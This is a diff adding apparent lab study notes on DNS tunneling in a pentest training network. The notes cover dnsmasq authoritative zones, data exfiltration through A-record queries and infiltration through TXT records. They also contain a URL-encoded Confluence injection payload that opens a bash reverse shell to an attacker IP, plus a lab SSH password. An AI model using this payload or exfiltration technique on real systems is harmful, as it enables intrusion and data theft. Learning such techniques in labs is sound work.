@@ -130,3 +130,145 @@ kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p
 ```
 
 Success!
+
+## DNS Tunneling Theory and Practice
+
+DNS can serve as a mechanism to tunnel data indirectly in and our of restrictive network environments.
+
+### DNS Tunneling Fundamentals
+
+Let's imagine we have a new server, FELINEAUTHORITY, which is on the WAN next to Kali. So, MULTISERVER03, CONFLUENCE01, and Kali can all route to it, but PGDATABSE01 and HRSHAREs cannot.
+
+FELINEAUTHORITY is this network's registered authoritative name sever for the feline.corp zone, and we will use it to observe how DNS packets reach an authoritative name server. We'll watch DNS packets being exchanged between PGDATABASE01 and FELINEAUTHORITY. While PGDATABASE01 cannot connect directly to FELINEAUTHORITY, it can connect to MULTISERVER03. MULTISERVER03 is also configured as the DNS resolver server for PGDATABASE01.
+
+We can only access PGDATABASE01 through CONFLUENCE01. So in order to connect to the SSH server on PGDATABASE01, we must pivot through CONFLUENCE01.
+
+Since FELINEAUTHORITY is also on the WAN, we can SSH directly into FELINEAUTHORITY using the username kali and the password 7he_C4t_c0ntro11er.
+
+```
+192.168.212.7 FELINEAUTHORITY
+10.4.212.215 PGDATABASE01
+192.168.212.64 MULTISERVER03
+192.168.212.63 CONFLUENCE01
+```
+
+```console
+// get shell to CONFLUENCE
+kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.245/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+confluence@confluence01:/opt/atlassian/confluence/bin$ 
+
+// get shell to FELINE
+kali$ ssh kali@192.168.212.7 -p 22                                                   
+kali@felineauthority:~$ 
+```
+
+You should have two open shells now. One on PG as database_admin, and one on FELINEAUTHORITY as kali.
+
+```console
+feline$ cd dns_tunneling
+
+feline$ cat dnsmasq.conf
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+feline$ sudo dnsmasq -C dnsmasq.conf -d
+[sudo] password for kali: 
+dnsmasq: started, version 2.89 cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+dnsmasq: warning: no upstream servers configured
+dnsmasq: cleared cache
+
+// get another shell on feline
+
+feline$ sudo tcpdump -i ens192 udp port 53
+listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+```
+
+Now move over to your PGDB shell.
+
+```console
+pg$ resolvectl status
+
+Link 5 (ens224)
+      Current Scopes: DNS        
+DefaultRoute setting: yes        
+       LLMNR setting: yes        
+MulticastDNS setting: no         
+  DNSOverTLS setting: no         
+      DNSSEC setting: no         
+    DNSSEC supported: no         
+  Current DNS Server: 10.4.50.64
+         DNS Servers: 10.4.50.64
+
+Link 4 (ens192)
+      Current Scopes: DNS        
+DefaultRoute setting: yes        
+       LLMNR setting: yes        
+MulticastDNS setting: no         
+  DNSOverTLS setting: no         
+      DNSSEC setting: no         
+    DNSSEC supported: no         
+  Current DNS Server: 10.4.50.64
+         DNS Servers: 10.4.50.64
+
+pg$ nslookup exfiltrated-data.feline.corp
+Server:		127.0.0.53
+Address:	127.0.0.53#53
+
+** server can't find exfiltrated-data.feline.corp: NXDOMAIN
+```
+
+Check the FELINEAUTHORITY tcpdump:
+
+```console
+18:01:23.183674 IP 192.168.212.64.54161 > 192.168.212.7.domain: 34371+ [1au] A? exfiltrated-data.feline.corp. (57)
+18:01:23.183745 IP 192.168.212.7.domain > 192.168.212.64.54161: 34371 NXDomain 0/0/1 (57)
+```
+
+An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its way to an external server we control. This illustrates that we can exfil data from inside the network to the outside, without a direct connection, just by making DNS queries.
+
+Exfiltrating a whole file may require a series of sequential requests.
+
+We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.
+
+What if we need to infiltrate data into the network? There are records other than A records, which is what we just looked at. We could use TXT records to infiltrate data into a network.
+
+We can serve TXT records from FELINEAUTHORITY using Dnsmasq. Kill the previous dnsmasq process and check the contents of dnsmasq_txt.conf and run dnsmasq again with this new configuration.
+
+```console
+feline$ cat dnsmasq_txt.conf
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+txt-record=www.feline.corp,here's something useful!
+txt-record=www.feline.corp,here's something else less useful.
+
+feline$ sudo dnsmasq -C dnsmasq_txt.conf -d
+```
+
+Return to PGDATABSE01.
+
+```console
+pg$ nslookup -type=txt www.feline.corp
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+Non-authoritative answer:
+www.feline.corp text = "here's something else less useful."
+www.feline.corp text = "here's something useful!"
+
+Authoritative answers can be found from:
+```
+
+This is one way to get data into an internal network using DNS records. If we wanted to infiltrate binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and convert that back into binary on the internal server.
